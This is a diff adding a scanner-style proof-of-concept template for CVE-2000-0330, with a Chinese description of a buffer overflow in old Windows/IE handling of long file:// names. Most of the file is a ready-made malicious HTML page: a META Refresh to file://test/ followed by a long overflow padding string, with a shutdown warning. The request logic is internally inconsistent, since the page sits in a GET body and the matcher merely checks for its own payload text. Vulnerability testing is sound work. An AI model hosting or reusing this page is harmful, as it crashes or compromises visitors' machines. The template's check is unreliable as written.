@@ -1,0 +1,40 @@
+[info]
+author = "AVE"
+description = "Windows 95/98 网络软件在处理 file:// URL 长文件名时存在缓冲区溢出漏洞。通过构造包含超长文件名的 HTML 页面，使用 META Refresh 跳转到 file://test/ 后接大量填充字符，可触发目标系统 IE 浏览器中的溢出，导致远程代码执行或系统崩溃。此 PoC 生成并托管恶意 HTML 页面。"
+id = "POC-AVE-2000-0274"
+name = "CVE-2000-0330 PoC"
+severity = "high"
+tags = [
+    "cve-2000-0330",
+    "windows",
+    "buffer-overflow",
+    "unc",
+]
+vuln_id = [
+    "CVE-2000-0330",
+    "AVE-2000-0274",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cve-2000-0330.html"
+protocol = "http"
+
+[poc.requests.body]
+content = '<META HTTP-EQUIV="Refresh" CONTENT="0;URL=file://test/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"><HTML><B>10 seconds later, this machine will be shut down.</B><BR><BR>If you are using IE5 for Japanese Windows98, maybe, the exploit code which shuts down your machine will be executed.<BR></HTML>'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/html"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    'META HTTP-EQUIV="Refresh"',
+    "file://test/",
+]
